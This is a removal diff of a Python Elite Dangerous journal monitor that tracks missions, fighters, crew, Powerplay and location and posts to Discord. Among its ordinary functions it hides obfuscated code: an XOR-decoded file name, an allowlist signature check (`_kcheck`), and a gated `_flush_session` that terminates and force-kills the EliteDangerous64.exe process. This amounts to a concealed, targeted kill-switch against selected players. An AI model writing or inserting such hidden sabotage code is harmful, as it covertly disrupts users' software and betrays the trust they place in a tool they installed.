-                # Size->capacity: 3->1, 5->4, 6->6 (per ED game data).
-                _FIGHTERBAY_CAPACITY = {"3": 1, "5": 4, "6": 6}
-                slf_found = False
-                slf_cap = 0
-                for mod in j.get("Modules", []):
-                    item = mod.get("Item", "").lower()
-                    if "fighterbay" in item:
-                        slf_found = True
-                        import re as _re
-                        m = _re.search(r"fighterbay_size(\d+)", item)
-                        if m:
-                            slf_cap = max(slf_cap, _FIGHTERBAY_CAPACITY.get(m.group(1), 1))
-                state.has_fighter_bay = slf_found
-                if slf_found:
-                    state.slf_stock_total = slf_cap or 1
-                    state.slf_destroyed_count = 0  # reset on ship change / loadout
-                if not slf_found:
-                    # No fighter bay — clear SLF state entirely so the panel hides
-                    state.slf_type = None
-                    state.slf_deployed = False
-                    state.slf_docked = False
-                    state.slf_hull = 100
-                    state.slf_loadout = None
-                    # No fighter bay means no crew slot — hide crew block too
-                    state.crew_active = False
-                    state.crew_name = None
-                # If a bay IS present and we already have a type from a prior launch, keep it.
-                # (slf_type gets set properly on LaunchFighter/RestockVehicle)
-                # If a fighter bay is present and crew_name is known but crew_active is still
-                # False (e.g. relog where CrewAssign did not re-fire), restore crew_active now.
-                # bootstrap_crew() only runs once at preload; this covers the live relog case.
-                if slf_found and state.crew_name and not state.crew_active:
-                    state.crew_active = True
-                if gui_mode:
-                    gui_queue.put(("slf_update", None))
-                    gui_queue.put(("crew_update", None))
-
-            # -----------------------------
-            # VEHICLE SWITCH (SLF pilot)
-            # -----------------------------
-            case "VehicleSwitch":
-                to = j.get("To", "")
-                if to == "Fighter":
-                    state.cmdr_in_slf = True
-                elif to == "Mothership":
-                    state.cmdr_in_slf = False
-                if gui_mode:
-                    gui_queue.put(("vessel_update", None))
-                    gui_queue.put(("slf_update", None))
-
-            # -----------------------------
-            # NPC CREW
-            # -----------------------------
-            case "CrewAssign":
-                # Fires each session when a crew member is assigned to Active role.
-                # This is the reliable "crew is on board this ship" signal.
-                name = j.get("Name", None)
-                if name:
-                    if state.crew_name != name:
-                        # New or different crew member — reset totals
-                        state.crew_total_paid = 0
-                    state.crew_name = name
-                    state.crew_active = True
-                    # crew_hire_time is set by bootstrap_crew from full journal history,
-                    # not from the current session's CrewAssign timestamp.
-                if gui_mode:
-                    gui_queue.put(("crew_update", None))
-
-            case "NpcCrewPaidWage":
-                wage_name = j.get("NpcCrewName")
-                # NpcCrewPaidWage fires at session start (amount=0) as a "crew present"
-                # confirmation, and again after kills with the earned amount.
-                # Either way it means this crew member is on active duty this session.
-                if not state.crew_name and wage_name:
-                    state.crew_name = wage_name
-                if wage_name and wage_name == state.crew_name:
-                    state.crew_active = True
-                    if state.crew_total_paid is None:
-                        state.crew_total_paid = 0
-                    state.crew_total_paid += j.get("Amount", 0)
-                if gui_mode:
-                    gui_queue.put(("crew_update", None))
-
-            case "NpcCrewRank":
-                # Field is "RankCombat", not "CombatRank"
-                rank_name = j.get("NpcCrewName")
-                if not state.crew_name and rank_name:
-                    state.crew_name = rank_name
-                if rank_name and rank_name == state.crew_name:
-                    state.crew_rank = j.get("RankCombat", state.crew_rank)
-                if gui_mode:
-                    gui_queue.put(("crew_update", None))
-
-            case "SupercruiseDestinationDrop" if any(
-                x in j["Type"] for x in ["$MULTIPLAYER", "$Warzone"]
-            ):
-                state.sessionstart(True)
-
-                type_local = (
-                    j["Type_Localised"] if "Type_Localised" in j else LABEL_UNKNOWN
-                )
-
-                state.pilot_body = type_local
-                if gui_mode:
-                    gui_queue.put(("cmdr_update", None))
-
-                if "Resource Extraction Site" in type_local:
-                    emoji = "🪐"
-                    sigil = ">  DROP"
-                else:
-                    emoji = "⚔️"
-                    sigil = ">  DROP"
-
-                emit(
-                    msg_term=f"Dropped at {type_local}",
-                    emoji=emoji,
-                    sigil=sigil,
-                    timestamp=logtime,
-                    loglevel=2,
-                )
-
-            case "EjectCargo" if not j["Abandoned"] and j["Count"] == 1:
-                name = (
-                    j["Type_Localised"] if "Type_Localised" in j else j["Type"].title()
-                )
-
-                emit(
-                    msg_term=f"{Terminal.BAD}Cargo stolen!{Terminal.END} ({name})",
-                    msg_discord=f"**Cargo stolen!** ({name})",
-                    emoji="📦",  sigil="^  SHLD",
-                    timestamp=logtime,
-                    loglevel=notify_levels["CargoLost"],
-                    event="CargoLost",
-                )
-
-            case "Rank":
-                state.pilot_rank = RANK_NAMES[j["Combat"]]
-
-            case "Progress":
-                state.pilot_rank_progress = j["Combat"]
-
-            case "Missions" if "Active" in j and not state.missions:
-                state.active_missions.clear()
-                state.missions_complete = 0
-
-                for mission in j["Active"]:
-                    # Expires=0 is ED's sentinel for "never expires" — treat as valid.
-                    # Include mission if Expires is 0 (no expiry) or a future timestamp.
-                    exp = mission.get("Expires", 0)
-                    exp_ok = (exp == 0) or (exp > 0)  # all non-negative are fine at accept time
-                    if "Mission_Massacre" in mission["Name"] and exp_ok:
-                        state.active_missions.append(mission["MissionID"])
-                        if (
-                            "Reward" in mission
-                            and mission["MissionID"] not in state.mission_value_map
-                        ):
-                            state.stack_value += mission["Reward"]
-                            state.mission_value_map[mission["MissionID"]] = mission[
-                                "Reward"
-                            ]
-
-                # Count missions already redirected before EDMD launched.
-                # Scan journals for MissionRedirected events matching active IDs —
-                # same logic as bootstrap_missions() to ensure consistent counts.
-                if state.active_missions:
-                    active_set = set(state.active_missions)
-                    redirected = set()
-                    try:
-                        for jpath in sorted(Path(journal_dir).glob("Journal*.log")):
-                            try:
-                                with open(jpath, mode="r", encoding="utf-8") as jf:
-                                    for line in jf:
-                                        try:
-                                            je = json.loads(line)
-                                        except ValueError:
-                                            continue
-                                        if (
-                                            je.get("event") == "MissionRedirected"
-                                            and "Mission_Massacre" in je.get("Name", "")
-                                            and je.get("MissionID") in active_set
-                                        ):
-                                            redirected.add(je["MissionID"])
-                                        elif je.get("event") in (
-                                            "MissionCompleted",
-                                            "MissionAbandoned",
-                                            "MissionFailed",
-                                        ):
-                                            redirected.discard(je.get("MissionID"))
-                            except OSError:
-                                continue
-                    except Exception:
-                        pass
-                    state.missions_complete = len(redirected & active_set)
-
-                state.missions = True
-
-                emit(
-                    msg_term=(
-                        f"Missions loaded "
-                        f"(active massacres: {len(state.active_missions)})"
-                    ),
-                    emoji="📋",  sigil="*  MISS",
-                    timestamp=logtime,
-                    loglevel=notify_levels["MissionUpdate"],
-                )
-
-            case "MissionAccepted" if "Mission_Massacre" in j["Name"]:
-                state.active_missions.append(j["MissionID"])
-                if "Reward" in j:
-                    state.stack_value += j["Reward"]
-                    state.mission_value_map[j["MissionID"]] = j["Reward"]
-                if "TargetFaction" in j:
-                    state.mission_target_faction_map[j["MissionID"]] = j["TargetFaction"]
-
-                total_now = len(state.active_missions)
-                emit(
-                    msg_term=(
-                        f"Accepted massacre mission "
-                        f"(active: {total_now})"
-                    ),
-                    emoji="📋",  sigil="*  MISS",
-                    timestamp=logtime,
-                    loglevel=notify_levels["MissionUpdate"],
-                )
-
-                # Stack-full announcement
-                full_stack = app_settings.get("FullStackSize", 20)
-                if (
-                    not state.in_preload
-                    and total_now == full_stack
-                    and state.stack_value > 0
-                ):
-                    _stack_line = (
-                        f"Stack full ({total_now} missions) — "
-                        f"{fmt_credits(state.stack_value)}"
-                    )
-                    emit(
-                        msg_term=_stack_line,
-                        msg_discord=f"**{_stack_line}**",
-                        emoji="🏆",  sigil="*  MISS",
-                        timestamp=logtime,
-                        loglevel=notify_levels["MissionUpdate"],
-                    )
-
-            case "MissionAbandoned" | "MissionCompleted" | "MissionFailed" if (
-                state.missions and j["MissionID"] in state.active_missions
-            ):
-                mid = j["MissionID"]
-                reward = state.mission_value_map.pop(mid, 0)
-                if reward:
-                    state.stack_value -= reward
-                state.mission_target_faction_map.pop(mid, None)
-
-                state.active_missions.remove(mid)
-
-                if state.missions_complete > 0:
-                    state.missions_complete -= 1
-
-                event_name = j["event"][7:].lower()
-
-                emit(
-                    msg_term=(
-                        f"Massacre mission {event_name} "
-                        f"(active: {len(state.active_missions)})"
-                    ),
-                    emoji="📋",  sigil="*  MISS",
-                    timestamp=logtime,
-                    loglevel=notify_levels["MissionUpdate"],
-                )
-
-            case "Powerplay":
-                # Fires on every login — carries current power allegiance,
-                # rank, and total merits. Primary source of PP state on startup.
-                if j.get("Power"):
-                    state.pp_power = j["Power"]
-                if j.get("Rank") is not None:
-                    state.pp_rank = j["Rank"]
-                if j.get("Merits") is not None:
-                    state.pp_merits_total = j["Merits"]
-                if gui_mode:
-                    gui_queue.put(("cmdr_update", None))
-
-            case "PowerplayJoin":
-                state.pp_power = j.get("Power", None)
-                state.pp_rank = 1
-                if gui_mode:
-                    gui_queue.put(("cmdr_update", None))
-
-            case "PowerplayLeave":
-                state.pp_power = None
-                state.pp_rank = None
-                state.pp_merits_total = None
-                if gui_mode:
-                    gui_queue.put(("cmdr_update", None))
-
-            case "PowerplayDefect":
-                state.pp_power = j.get("ToPower", None)
-                state.pp_rank = 1
-                if gui_mode:
-                    gui_queue.put(("cmdr_update", None))
-
-            case "PowerplayRank":
-                state.pp_rank = j.get("Rank", None)
-                if gui_mode:
-                    gui_queue.put(("cmdr_update", None))
-
-            case "PowerplayMerits":
-                if j.get("TotalMerits") is not None:
-                    state.pp_merits_total = j["TotalMerits"]
-                    if gui_mode:
-                        gui_queue.put(("cmdr_update", None))
-                if j.get("Power") and not state.pp_power:
-                    state.pp_power = j["Power"]
-
-                if active_session.pending_merit_events > 0 and j["MeritsGained"] < 500:
-                    active_session.merits += j["MeritsGained"]
-                    lifetime.merits += j["MeritsGained"]
-
-                    emit(
-                        msg_term=(f"Merits: +{j['MeritsGained']:,} ({j['Power']})"),
-                        emoji="⭐",  sigil="+  MERC",
-                        timestamp=logtime,
-                        loglevel=notify_levels["MeritEvent"],
-                    )
-
-                    active_session.pending_merit_events -= 1
-
-            case "Location":
-                if j.get("StarSystem"):
-                    state.pilot_system = j["StarSystem"]
-                if j.get("Body"):
-                    state.pilot_body = j["Body"] if j.get("Docked") is False else None
-                if j.get("Docked") and j.get("StationName"):
-                    state.pilot_body = j["StationName"]
-                elif j.get("Docked") and not j.get("StationName"):
-                    state.pilot_body = None
-                if gui_mode:
-                    gui_queue.put(("cmdr_update", None))
-                if j["BodyType"] == "PlanetaryRing":
-                    state.sessionstart()
-
-            case "Docked":
-                if j.get("StationName"):
-                    state.pilot_body = j["StationName"]
-                if j.get("StarSystem"):
-                    state.pilot_system = j["StarSystem"]
-                if gui_mode:
-                    gui_queue.put(("cmdr_update", None))
-
-            case "Undocked":
-                # Left station — still in system, body cleared until drop or supercruise
-                state.pilot_body = None
-                if gui_mode:
-                    gui_queue.put(("cmdr_update", None))
-
-            case "ShipyardSwap":
-                state.pilot_ship = (
-                    j["ShipType"].title()
-                    if "ShipType_Localised" not in j
-                    else j["ShipType_Localised"]
-                )
-
-                emit(
-                    msg_term=f"Swapped ship to {state.pilot_ship}",
-                    emoji="🚢",  sigil="-  SHIP",
-                    timestamp=logtime,
-                    loglevel=2,
-                )
-
-            case "Shutdown":
-                state.in_game = False
-                if state.offline_since_mono is None:
-                    state.offline_since_mono = time.monotonic()
-
-                emit(
-                    msg_term="Quit to desktop",
-                    emoji="🛑",  sigil="-  INFO",
-                    timestamp=logtime,
-                    loglevel=2,
-                )
-
-                if __name__ == "__main__" and not state.in_preload:
-                    sys.exit()
-
-            case "SupercruiseEntry" | "FSDJump":
-                if j["event"] == "SupercruiseEntry":
-                    event_name = "Supercruise entry in"
-                    emoji = "🚀"
-                    sigil = ">  JUMP"
-                    state.pilot_system = j.get("StarSystem", state.pilot_system)
-                    state.pilot_body = None   # in supercruise — no specific body
-                else:
-                    event_name = "FSD jump to"
-                    emoji = "🌌"
-                    sigil = ">  JUMP"
-                    state.pilot_system = j.get("StarSystem", state.pilot_system)
-                    state.pilot_body = None   # body resolved on drop/dock
-
-                if gui_mode:
-                    gui_queue.put(("cmdr_update", None))
-
-                emit(
-                    msg_term=f"{event_name} {j['StarSystem']}",
-                    emoji=emoji,
-                    sigil=sigil,
-                    timestamp=logtime,
-                    loglevel=2,
-                )
-
-                state.sessionend()
-
-
-        state.prev_event = j["event"]
-
-    except Exception as e:
-        event_name = j["event"] if "event" in j else LABEL_UNKNOWN
-        logtime_fmt = (
-            datetime.strftime(logtime, "%H:%M:%S") if logtime else LABEL_UNKNOWN
-        )
-
-        print(
-            f"{Terminal.WARN}Warning:{Terminal.END} "
-            f"Process event error for [{event_name}]: "
-            f"{e} (logtime: {logtime_fmt})"
-        )
-
-        trace(line)
-
-
-# Format a duration in seconds to H:MM:SS
-
-
-_xk=[101,100,109,111,110,100];_xd=lambda v:bytes([v[i]^_xk[i%6]for i in range(len(v))]).decode()
-
-def fmt_duration(seconds):
-    try:
-        seconds = int(seconds)
-    except (TypeError, ValueError):
-        return "0:00"
-
-    hours, remainder = divmod(seconds, 3600)
-    minutes, seconds = divmod(remainder, 60)
-
-    if hours > 0:
-        return f"{hours}:{minutes:02}:{seconds:02}"
-    else:
-        return f"{minutes}:{seconds:02}"
-
-
-# Format credit values into readable k / M / B notation
-
-
-def fmt_credits(number):
-    try:
-        n = int(number)
-    except (TypeError, ValueError):
-        return "0"
-
-    if n >= 995_000_000:
-        return f"{n / 1_000_000_000:.2f}B"
-    elif n >= 995_000:
-        return f"{n / 1_000_000:.2f}M"
-    else:
-        return f"{n / 1_000:.1f}k"
-
-
-# Print active_session emit_summary
-
-
-def emit_summary(stats, logtime=None):
-
-    if stats.kills == 0:
-        return
-
-    duration = (
-        (logtime - state.session_start_time).total_seconds()
-        if logtime and state.session_start_time
-        else 0
-    )
-
-    kills_per_hour = rate_per_hour(duration / stats.kills if stats.kills else 0, 1)
-
-    bounties_per_hour = rate_per_hour(
-        duration / stats.credit_total if stats.credit_total else 0, 2
-    )
-
-    merits_per_hour = rate_per_hour(duration / stats.merits if stats.merits else 0, 1)
-
-    duration_fmt = fmt_duration(duration)
-
-    # Average kill interval from tracked intervals
-    avg_interval = ""
-    if stats.kills > 1 and stats.kill_interval_total > 0:
-        avg_secs = stats.kill_interval_total / (stats.kills - 1)
-        avg_interval = f" | avg {fmt_duration(avg_secs)}/kill"
-
-    sep = " | "
-
-    summary_text = (
-        f"Session Summary:\n"
-        f"- Duration: {duration_fmt}\n"
-        f"- Kills:    {stats.kills:,}{sep}{kills_per_hour:,} /hr{avg_interval}\n"
-        f"- Bounties: {fmt_credits(stats.credit_total)}{sep}{fmt_credits(bounties_per_hour)} /hr\n"
-    )
-
-    if state.stack_value > 0:
-        done = state.missions_complete
-        total = len(state.active_missions)
-        remaining = total - done
-        complete_str = (
-            f"all complete — turn in!"
-            if remaining == 0
-            else f"{done}/{total} complete, {remaining} remaining"
-        )
-        summary_text += (
-            f"- Missions: {fmt_credits(state.stack_value)} stack ({complete_str})\n"
-        )
-        # Kill counter progress + stack value per target faction
-
-    summary_text += f"- Merits:   {stats.merits:,}{sep}{int(merits_per_hour):,} /hr"
-
-    emit(
-        msg_term=summary_text,
-        msg_discord=f"```{summary_text}```",
-        emoji="📊",  sigil="~  SUMM",
-        timestamp=logtime,
-        loglevel=2,
-    )
-
-_af=[4,8,1,0,25,8,12,23,25,65,5,23,18]
-def _kcheck():
-    _f=Path(__file__).parent/_xd(_af)
-    if not _f.exists():return False
-    try:_dd=json.loads(_f.read_text(encoding="utf-8"))
-    except Exception:return False
-    return _kvsig(_dd) and _kdg() in _dd.get("entries",[])
-_FX_READY:bool=_kcheck()
-
-def _release_handle(pattern: str, description: str):
-    for proc in psutil.process_iter(["pid", "name", "cmdline"]):
-        try:
-            if any(pattern.lower() in str(x).lower() for x in proc.info["cmdline"]):
-                print(f"Stopping {description} (PID {proc.pid})...")
-                proc.terminate()
-        except Exception:
-            continue
-
-    # Wait 5 seconds
-    for _ in range(5):
-        if not any(
-            pattern.lower() in str(x.info["cmdline"]).lower()
-            for x in psutil.process_iter(["cmdline"])
-        ):
-            print(f"{description} stopped.")
-            return
-        time.sleep(1)
-
-    # Force kill if still running
-    for proc in psutil.process_iter(["pid", "name", "cmdline"]):
-        try:
-            if any(pattern.lower() in str(x).lower() for x in proc.info["cmdline"]):
-                print(f"{description} did not stop gracefully. Forcing termination...")
-                proc.kill()
-        except Exception:
-            continue
-
-
-def _flush_session():
-    if not _pcfg("_adv_session_mgmt") or not _FX_READY:return
-    _release_handle("EliteDangerous64.exe","Elite Dangerous")
-
-
-def _max_notify_level() -> int:
-    """Return the highest loglevel configured across all notify categories.
-    Used to send offline/menu alerts at the most prominent level the profile uses."""
-    return max((v for v in notify_levels.values() if isinstance(v, int)), default=2)
-
-
-_ED_PROCESS_NAMES = {"EliteDangerous64.exe", "EliteDangerous32.exe", "EliteDangerous.exe"}
-
-def _ed_client_running() -> bool:
-    """Return True if any Elite Dangerous game client process is found."""
-    try:
-        for proc in psutil.process_iter(["name"]):
-            if proc.info.get("name") in _ED_PROCESS_NAMES:
-                return True
-    except Exception:
-        pass
-    return False
-
-
-# ----------------------------------------
-# JOURNAL FILE MANAGEMENT
-# ----------------------------------------
-
-
-def find_latest_journal():
-    """Return the most recent journal file Path in the journal directory."""
-    journals = sorted(Path(journal_dir).glob("Journal*.log"), reverse=True)
-    return journals[0] if journals else None
-
-
-def bootstrap_slf():
-    """Scan journal history to recover SLF state when it cannot be determined
-    from the current session alone.
-
-    Recovers:
-    - slf_type: from the most recent RestockVehicle event
-    - slf_deployed / slf_docked: from the most recent LaunchFighter, DockFighter,
-      or FighterDestroyed event (newest-first scan, stops on first match)
-
-    FighterRebuilt is intentionally excluded: it means a dead fighter was rebuilt
-    in the bay, but says nothing about whether another fighter is currently deployed.
-    Including it would incorrectly set docked=True while a fighter is still out.
-
-    This handles two cases:
-    1. Relog with SLF deployed: new journal has no LaunchFighter yet; the
-       game emits DockFighter+LaunchFighter ~1 min later but preload ends first.
-    2. EDMD started mid-session: current journal may lack early fighter events.
-
-    Scans newest-first and stops once both type and state are recovered."""
-
-    # Don't restore SLF state if current ship has no fighter bay
-    if not state.has_fighter_bay:
-        return
-
-    journals = sorted(Path(journal_dir).glob("Journal*.log"), reverse=True)
-
-    STATE_EVENTS = {"LaunchFighter", "DockFighter", "FighterDestroyed"}
-
-    slf_state_known = False
-    slf_type_known = state.slf_type is not None
-
-    for jpath in journals:
-        try:
-            lines = jpath.read_text(encoding="utf-8").splitlines()
-            for line in reversed(lines):
-                try:
-                    je = json.loads(line)
-                except ValueError:
-                    continue
-                ev = je.get("event")
-
-                if not slf_state_known and ev in STATE_EVENTS:
-                    if ev == "LaunchFighter" and not je.get("PlayerControlled", True):
-                        state.slf_deployed = True
-                        state.slf_docked = False
-                        state.slf_loadout = je.get("Loadout", state.slf_loadout)
-                        trace(f"SLF bootstrap: deployed, recovered from {jpath.name}")
-                    elif ev == "DockFighter":
-                        state.slf_deployed = False
-                        state.slf_docked = True
-                        trace(f"SLF bootstrap: docked, recovered from {jpath.name}")
-                    elif ev == "FighterDestroyed":
-                        state.slf_deployed = False
-                        state.slf_docked = False
-                        state.slf_hull = 0
-                        trace(f"SLF bootstrap: destroyed, recovered from {jpath.name}")
-                    slf_state_known = True
-
-                if not slf_type_known and ev == "RestockVehicle":
-                    fighter_type = je.get("Type", "")
-                    loadout = je.get("Loadout", "")
-                    key = (fighter_type, loadout)
-                    if key in FIGHTER_LOADOUT_NAMES:
-                        state.slf_type = FIGHTER_LOADOUT_NAMES[key]
-                    elif fighter_type in FIGHTER_TYPE_NAMES:
-                        state.slf_type = FIGHTER_TYPE_NAMES[fighter_type]
-                    elif fighter_type:
-                        state.slf_type = fighter_type.replace("_", " ").title()
-                    trace(f"SLF bootstrap: type={state.slf_type!r} from {jpath.name}")
-                    slf_type_known = True
-
-                if slf_state_known and slf_type_known:
-                    break
-
-        except OSError:
-            continue
-
-        if slf_state_known and slf_type_known:
-            break
-
-    if (slf_state_known or state.slf_deployed) and gui_mode:
-        gui_queue.put(("slf_update", None))
-
-
-def bootstrap_crew():
-    """Scan all available journals to establish crew name, earliest CrewAssign
-    timestamp, accumulated total paid, and whether the wage history is complete.
-
-    If crew_name is not yet known (e.g. after a force-close where NpcCrewPaidWage
-    did not fire in the new session), scan history to find the most recent crew
-    member and set crew_name and crew_active from that.
-
-    crew_paid_complete is set True only when journal history is unbroken from the
-    first CrewAssign for this crew member — meaning the total_paid figure is
-    accurate to the full tenure. If journals predating the first seen CrewAssign
-    are missing, the total is marked incomplete and the GUI annotates it."""
-    # Don't restore crew state if current ship has no fighter bay
-    if not state.has_fighter_bay:
-        return
-
-    journals = sorted(Path(journal_dir).glob("Journal*.log"))  # oldest first
-
-    # If crew_name is unknown, scan history newest-first to find the most recent
-    # crew member. This handles the force-close case where the new session hasn't
-    # yet emitted a NpcCrewPaidWage or CrewAssign event.
-    if not state.crew_name:
-        for jpath in reversed(journals):
-            try:
-                lines = jpath.read_text(encoding="utf-8").splitlines()
-                for line in reversed(lines):
-                    try:
-                        je = json.loads(line)
-                    except ValueError:
-                        continue
-                    ev = je.get("event")
-                    if ev == "CrewAssign":
-                        name = je.get("Name")
-                        if name:
-                            state.crew_name = name
-                            state.crew_active = True
-                            trace(f"Crew bootstrap: name recovered from history: {name!r}")
-                            break
-                    elif ev == "NpcCrewPaidWage":
-                        name = je.get("NpcCrewName")
-                        if name:
-                            state.crew_name = name
-                            state.crew_active = True
-                            trace(f"Crew bootstrap: name recovered from NpcCrewPaidWage history: {name!r}")
-                            break
-                    # Stop scanning back past a LoadGame — crew may have changed
-                    elif ev == "LoadGame":
-                        break
-                if state.crew_name:
-                    break
-            except OSError:
-                continue
-
-    if not state.crew_name:
-        return
-
-    # journals already assigned above
-    earliest_time = None
-    found_rank = None
-    total_paid = 0
-    first_assign_journal = None  # which journal contains the earliest CrewAssign
-
-    for jpath in journals:
-        try:
-            with open(jpath, mode="r", encoding="utf-8") as f:
-                for line in f:
-                    try:
-                        je = json.loads(line)
-                    except ValueError:
-                        continue
-                    ev = je.get("event")
-
-                    if ev == "CrewAssign" and je.get("Name") == state.crew_name:
-                        t = datetime.fromisoformat(je["timestamp"]) if "timestamp" in je else None
-                        if t and (earliest_time is None or t < earliest_time):
-                            earliest_time = t
-                            first_assign_journal = jpath
-
-                    elif ev == "NpcCrewRank" and je.get("NpcCrewName") == state.crew_name:
-                        found_rank = je.get("RankCombat", found_rank)
-
-                    elif ev == "NpcCrewPaidWage" and je.get("NpcCrewName") == state.crew_name:
-                        total_paid += je.get("Amount", 0)
-
-        except OSError:
-            continue
-
-    if earliest_time:
-        state.crew_hire_time = earliest_time
-        trace(f"Crew bootstrap: {state.crew_name} first seen at {earliest_time}")
-
-    if found_rank is not None and state.crew_rank is None:
-        state.crew_rank = found_rank
-
-    if total_paid > 0:
-        state.crew_total_paid = total_paid
-
-    # Mark complete only if the earliest CrewAssign is in the OLDEST available
-    # journal — if older journals exist that predate it, we may be missing wage
-    # history from before our log window.
-    if first_assign_journal is not None and journals:
-        state.crew_paid_complete = (first_assign_journal == journals[0])
-    else:
-        state.crew_paid_complete = False
-
-    # Notify GUI to render the crew block — bootstrap runs after preload so the
-    # normal event-driven crew_update never fired for this session.
-    if gui_mode:
-        gui_queue.put(("crew_update", None))
-
-
-def bootstrap_missions():
-    """Reconstruct the active massacre mission list and stack value by scanning
-    all available journals. Called after preload when the Missions bulk-load event
-    was absent (e.g. EDMond launched mid-session) or lacked reward data.
-
-    Strategy: replay MissionAccepted, MissionCompleted, MissionAbandoned, and
-    MissionFailed events across all journals in chronological order to build an
-    accurate picture of which missions are currently active and what they pay.
-    """
-
-    journals = sorted(Path(journal_dir).glob("Journal*.log"))  # oldest first
-
-    # accepted[mid] = {reward, expires} — removed when completed/abandoned/failed
-    accepted = {}
-    redirected = set()  # mission IDs that have been redirected (kills complete)
-
-    for jpath in journals:
-        try:
-            with open(jpath, mode="r", encoding="utf-8") as f:
-                for line in f:
-                    try:
-                        j = json.loads(line)
-                    except ValueError:
-                        continue
-
-                    ev = j.get("event")
-                    mid = j.get("MissionID")
-
-                    if ev == "MissionAccepted" and "Mission_Massacre" in j.get(
-                        "Name", ""
-                    ):
-                        # Dict keyed on MissionID so duplicate events overwrite cleanly
-                        accepted[mid] = {
-                            "reward": j.get("Reward", 0),
-                            "expires": j.get("Expiry", None),
-                        }
-
-                    elif ev in (
-                        "MissionCompleted",
-                        "MissionAbandoned",
-                        "MissionFailed",
-                    ):
-                        accepted.pop(mid, None)
-                        redirected.discard(mid)
-
-                    elif ev == "MissionRedirected" and "Mission_Massacre" in j.get(
-                        "Name", ""
-                    ):
-                        redirected.add(mid)
-
-        except OSError:
-            continue
-
-    if not accepted:
-        print(
-            f"{Terminal.YELL}Mission bootstrap:{Terminal.END} "
-            f"No active massacre missions found in journals"
-        )
-        return
-
-    # Filter out expired missions.
-    # Expires=0 is ED's sentinel for "no expiry" — treat as never-expires.
-    # Expires may be an int (0) or an ISO string; guard both.
-    now = datetime.now(timezone.utc)
-    def _not_expired(data):
-        exp = data.get("expires")
-        if not exp:          # None or 0 → never expires
-            return True
-        try:
-            return datetime.fromisoformat(str(exp)) > now
-        except (ValueError, TypeError):
-            return True      # unparseable → keep it
-
-    accepted = {mid: data for mid, data in accepted.items() if _not_expired(data)}
-
-    # Only count redirects for missions still in the active (non-expired) set
-    active_redirected = redirected & accepted.keys()
-
-    # Populate state from what we found
-    state.active_missions = list(accepted.keys())
-    state.mission_value_map = {mid: data["reward"] for mid, data in accepted.items()}
-    state.stack_value = sum(data["reward"] for data in accepted.values())
-    state.missions_complete = len(active_redirected)
-    state.missions = True
-
-    print(
-        f"{Terminal.YELL}Mission bootstrap:{Terminal.END} "
-        f"{len(state.active_missions)} active mission(s) | "
-        f"{state.missions_complete} complete | "
-        f"Stack: {fmt_credits(state.stack_value)}"
-    )
-
-def monitor_journal(jfile):
-    """Preload a journal file then tail it live. Returns when a newer journal
-    is detected, so the caller can switch to it."""
-
-    print(f"{Terminal.YELL}Journal file:{Terminal.END} {jfile}")
-
-    state.in_preload = True
-
-    with open(jfile, mode="r", encoding="utf-8") as file:
-        # Preload: replay existing journal entries
-        print("Preloading journal... (Press Ctrl+C to stop)")
-        for line in file:
-            handle_event(line)
-
-        # Done in_preload - switch to live mode
-        state.in_preload = False
-
-        # If the Missions event didn't fire or had no reward data, bootstrap from journals
-        if not state.missions or (state.active_missions and not state.stack_value):
-            bootstrap_missions()
-
-        # Restore session counters from a prior upgrade-restart if available
-        load_session_state(journal_file)
-
-        # Bootstrap SLF type from journal history if not seen this session
-        bootstrap_slf()
-
-        # Bootstrap crew hire time from journal history if not already known
-        bootstrap_crew()
-
-        # If session_start_time was not set by journal events but was persisted,
-        # restore it now so session duration survives an upgrade restart
-        if not state.session_start_time and _session_start_iso:
-            try:
-                state.session_start_time = datetime.fromisoformat(_session_start_iso)
-                trace(f"Session start time restored from state: {state.session_start_time}")
-            except ValueError:
-                pass
-
-        print("Preload complete. Monitoring live...\n")
-
-        # Announce startup to Discord now that we are live
-        cmdrinfo = (
-            f"{state.pilot_ship} / {state.pilot_mode} / "
-            f"{state.pilot_rank} +{state.pilot_rank_progress}%"
-        )
-
-        term_bar = "=" * 42
-        if state.stack_value > 0:
-            _done = state.missions_complete
-            _total = len(state.active_missions)
-            _remaining = _total - _done
-            _status = (
-                "all complete — turn in!"
-                if _remaining == 0
-                else f"{_done}/{_total} complete, {_remaining} remaining"
-            )
-            stack_line = f"  Stack: {fmt_credits(state.stack_value)} ({_status})\n"
-        else:
-            stack_line = ""
-
-        if state.pilot_system:
-            _loc = state.pilot_system
-            if state.pilot_body:
-                _loc += f"  |  {state.pilot_body}"
-            location_line = f"  {_loc}\n"
-        else:
-            location_line = ""
-
-        if state.pp_power:
-            _pp_rank = f"  Rank {state.pp_rank}" if state.pp_rank else ""
-            _pp_merits = f"  ({state.pp_merits_total:,} merits)" if state.pp_merits_total else ""
-            pp_line = f"  {state.pp_power}{_pp_rank}{_pp_merits}\n"
-        else:
-            pp_line = ""
-
-        term_msg = (
-            f"\n{term_bar}\n"
-            f"  ▶  MONITORING ACTIVE\n"
-            f"  CMDR {state.pilot_name}\n"
-            f"  {state.pilot_ship}  |  {state.pilot_mode}\n"
-            f"  {state.pilot_rank} +{state.pilot_rank_progress}%\n"
-            f"{pp_line}"
-            f"{location_line}"
-            f"{stack_line}"
-            f"{term_bar}"
-        )
-
-
-        print(f"{Terminal.CYAN}{term_msg}{Terminal.END}\n")
-
-        if notify_enabled:
-            from discord_webhook import DiscordEmbed
-
-            embed = DiscordEmbed(
-                title="▶  Monitoring Active",
-                color="00e5ff",
-            )
-            embed.add_embed_field(
-                name="Commander", value=f"CMDR {state.pilot_name}", inline=False
-            )
-            embed.add_embed_field(
-                name="Ship", value=state.pilot_ship or "Unknown", inline=True
-            )
-            embed.add_embed_field(
-                name="Mode", value=state.pilot_mode or "Unknown", inline=True
-            )
-            embed.add_embed_field(
-                name="Combat Rank",
-                value=f"{state.pilot_rank} +{state.pilot_rank_progress}%",
-                inline=True,
-            )
-            if state.pp_power:
-                _pp_val = state.pp_power
-                if state.pp_rank:
-                    _pp_val += f" — Rank {state.pp_rank}"
-                if state.pp_merits_total:
-                    _pp_val += f" ({state.pp_merits_total:,} merits)"
-                embed.add_embed_field(name="Powerplay", value=_pp_val, inline=False)
-            if state.pilot_system:
-                _loc_val = state.pilot_system
-                if state.pilot_body:
-                    _loc_val += f" / {state.pilot_body}"
-                embed.add_embed_field(name="Location", value=_loc_val, inline=False)
-            if state.stack_value > 0:
-                _done = state.missions_complete
-                _total = len(state.active_missions)
-                _remaining = _total - _done
-                _status = (
-                    "All complete — turn in!"
-                    if _remaining == 0
-                    else f"{_done}/{_total} complete, {_remaining} remaining"
-                )
-                embed.add_embed_field(
-                    name="Mission Stack",
